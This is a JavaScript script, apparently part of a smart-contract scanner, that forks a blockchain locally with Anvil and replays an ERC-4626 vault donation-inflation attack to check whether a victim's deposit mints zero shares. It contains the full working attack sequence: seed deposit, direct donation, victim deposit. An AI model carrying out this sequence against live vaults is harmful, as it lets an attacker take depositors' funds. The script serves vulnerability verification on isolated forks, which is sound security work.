import { spawn } from "node:child_process";
import { readFile } from "node:fs/promises";
import { AbiCoder, Contract, JsonRpcProvider, keccak256, toBeHex } from "ethers";

const input = JSON.parse(await readFile(process.argv[2], "utf8"));
const localUrl = "http://127.0.0.1:18545";
const vaultAbi = [
  "function asset() view returns (address)",
  "function totalAssets() view returns (uint256)",
  "function totalSupply() view returns (uint256)",
  "function balanceOf(address) view returns (uint256)",
  "function deposit(uint256,address) returns (uint256)",
];
const tokenAbi = [
  "function decimals() view returns (uint8)",
  "function mint(address,uint256)",
  "function approve(address,uint256) returns (bool)",
  "function transfer(address,uint256) returns (bool)",
  "function balanceOf(address) view returns (uint256)",
];

function inconclusive(reason, extra = {}) {
  return { outcome: "inconclusive", reason, transactions: [], ...extra };
}

async function run() {
  const anvil = spawn(process.env.ANVIL_BIN ?? "/vercel/run/node_modules/.bin/anvil", [
    "--fork-url", input.rpcUrl,
    "--fork-block-number", String(input.blockNumber),
    "--chain-id", String(input.chainId),
    "--host", "127.0.0.1",
    "--port", "18545",
    "--silent",
  ], { stdio: "ignore" });
  try {
    const provider = new JsonRpcProvider(localUrl, input.chainId, { staticNetwork: true });
    let ready = false;
    for (let attempt = 0; attempt < 40; attempt++) {
      if (anvil.exitCode !== null) break;
      try {
        await provider.getBlockNumber();
        ready = true;
        break;
      } catch {
        await new Promise((resolve) => setTimeout(resolve, 500));
      }
    }
    if (!ready) return inconclusive("The pinned chain fork could not start. The RPC may not support this historical block.");
    if (input.blockHash) {
      const pinned = await provider.getBlock(input.blockNumber);
      if (pinned?.hash?.toLowerCase() !== input.blockHash.toLowerCase()) {
        return inconclusive("The forked block hash differs from the captured RPC block. Retry the scan.");
      }
    }

    const code = await provider.getCode(input.contractAddress);
    if (code === "0x" || keccak256(code) !== input.codeHash) {
      return inconclusive("Fork runtime differs from the selected scan. Rescan this contract at the intended block.");
    }
    const [attacker, victim] = await Promise.all([provider.getSigner(0), provider.getSigner(1)]);
    const attackerAddress = await attacker.getAddress();
    const victimAddress = await victim.getAddress();
    const vault = new Contract(input.contractAddress, vaultAbi, attacker);
    let assetAddress;
    let supply;
    let assets;
    try {
      [assetAddress, supply, assets] = await Promise.all([vault.asset(), vault.totalSupply(), vault.totalAssets()]);
    } catch {
      return inconclusive("The target did not respond to the ERC-4626 vault probes on the fork.");
    }
    const observedSupply = supply;
    const observedAssets = assets;
    let stateFixture = "live-snapshot";
    if ((supply !== 0n || assets !== 0n) && input.emptyReferenceFixture === true && assetAddress.toLowerCase() === input.expectedAssetAddress?.toLowerCase()) {
      const zero = toBeHex(0n, 32);
      const vaultSupplySlot = toBeHex(0n, 32);
      const tokenVaultBalanceSlot = keccak256(AbiCoder.defaultAbiCoder().encode(["address", "uint256"], [input.contractAddress, 1n]));
      await provider.send("anvil_setStorageAt", [input.contractAddress, vaultSupplySlot, zero]);
      await provider.send("anvil_setStorageAt", [assetAddress, tokenVaultBalanceSlot, zero]);
      await provider.send("evm_mine", []);
      [supply, assets] = await Promise.all([vault.totalSupply(), vault.totalAssets()]);
      stateFixture = "reference-empty-reset";
    }
    if (supply !== 0n || assets !== 0n) {
      return inconclusive("This donation-inflation scenario requires an empty vault at the pinned block.", {
        assetAddress, initialSupply: supply.toString(), initialAssets: assets.toString(),
        observedSupply: observedSupply.toString(), observedAssets: observedAssets.toString(), stateFixture,
      });
    }

    const token = new Contract(assetAddress, tokenAbi, attacker);
    let decimals;
    try { decimals = Number(await token.decimals()); } catch { decimals = 18; }
    if (!Number.isInteger(decimals) || decimals < 0 || decimals > 24) {
      return inconclusive("The asset precision is outside this replay template's supported range.", { assetAddress });
    }
    const victimDeposit = 10n ** BigInt(decimals);
    const donation = 2n * victimDeposit;
    const seed = 1n;
    const transactions = [];
    async function send(label, transaction) {
      const receipt = await transaction.wait();
      if (!receipt || receipt.status !== 1) throw new Error(`${label} did not succeed on the fork.`);
      transactions.push({ label, hash: receipt.hash, gasUsed: receipt.gasUsed.toString() });
    }

    try {
      await send("Fund attacker on fork", await token.mint(attackerAddress, seed + donation));
      await send("Fund victim on fork", await token.mint(victimAddress, victimDeposit));
      if (await token.balanceOf(attackerAddress) < seed + donation ||
          await token.balanceOf(victimAddress) < victimDeposit) {
        return inconclusive("The asset's mint behavior did not provide the expected fork-only test balances.", { assetAddress });
      }
    } catch {
      return inconclusive("The vault asset cannot be provisioned through this template's public mint interface. No attack result was inferred.", { assetAddress });
    }

    try {
      await send("Approve seed", await token.approve(input.contractAddress, seed));
      await send("First deposit", await vault.deposit(seed, attackerAddress));
      if (await vault.balanceOf(attackerAddress) === 0n) {
        return inconclusive("The first depositor received no shares, so this is not the expected ERC-4626 scenario.", { assetAddress, transactions });
      }
      const assetsBeforeDonation = await vault.totalAssets();
      await send("Direct donation", await token.transfer(input.contractAddress, donation));
      if (await vault.totalAssets() - assetsBeforeDonation !== donation) {
        return inconclusive("The direct donation did not increase vault assets by the expected amount.", { assetAddress, transactions });
      }
      await send("Approve victim deposit", await token.connect(victim).approve(input.contractAddress, victimDeposit));
      const beforeShares = await vault.balanceOf(victimAddress);
      const beforeVictimAssets = await token.balanceOf(victimAddress);
      const beforeVaultAssets = await vault.totalAssets();
      let victimReverted = false;
      try {
        await send("Victim deposit", await vault.connect(victim).deposit(victimDeposit, victimAddress));
      } catch (error) {
        if (error?.code !== "CALL_EXCEPTION") {
          return inconclusive("The victim deposit could not be classified because the fork RPC failed.", { assetAddress, transactions });
        }
        victimReverted = true;
      }
      const afterShares = await vault.balanceOf(victimAddress);
      const mintedShares = afterShares - beforeShares;
      if (!victimReverted && (beforeVictimAssets - await token.balanceOf(victimAddress) !== victimDeposit ||
          await vault.totalAssets() - beforeVaultAssets !== victimDeposit)) {
        return inconclusive("The victim deposit did not move the expected asset amount; share results were not classified.", { assetAddress, transactions });
      }
      return {
        outcome: victimReverted ? "deposit-reverted" : mintedShares === 0n ? "reproduced" : "not-reproduced",
        reason: victimReverted
          ? "The victim deposit reverted; zero-share minting was not reproduced."
          : mintedShares === 0n
            ? "A non-zero victim deposit succeeded but minted zero shares on the isolated fork."
            : "The victim deposit minted shares with these parameters; this does not prove the vault is safe.",
        assetAddress,
        initialSupply: supply.toString(), initialAssets: assets.toString(),
        observedSupply: observedSupply.toString(), observedAssets: observedAssets.toString(), stateFixture,
        seedAssets: seed.toString(), donatedAssets: donation.toString(),
        victimDepositAssets: victimDeposit.toString(), victimShares: mintedShares.toString(),
        transactions,
      };
    } catch (error) {
      return inconclusive(`The attack sequence stopped before the victim deposit: ${error instanceof Error ? error.message : "unknown fork error"}`, {
        assetAddress, transactions,
      });
    }
  } finally {
    anvil.kill();
  }
}

try {
  process.stdout.write(`${JSON.stringify(await run())}\n`);
} catch (error) {
  process.stdout.write(`${JSON.stringify(inconclusive(error instanceof Error ? error.message : "Fork replay failed."))}\n`);
}
